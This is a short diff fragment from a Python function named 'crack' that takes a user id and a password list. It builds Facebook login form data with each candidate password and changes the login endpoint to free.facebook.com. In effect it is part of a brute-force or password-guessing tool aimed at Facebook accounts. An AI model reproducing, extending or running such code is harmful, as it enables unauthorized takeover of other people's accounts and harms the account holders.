@@ -194,7 +194,7 @@ def crack(uid, password_list, total_count):
             'had_password_prefilled': 'true',
             'ab_test_data': '//AAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAA//////BAAM',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Flegal%2Fai-terms&lwv=120&lwc=1348092"
+            url = "https://free.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Flegal%2Fai-terms&lwv=120&lwc=1348092"
             headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://www.facebook.com',
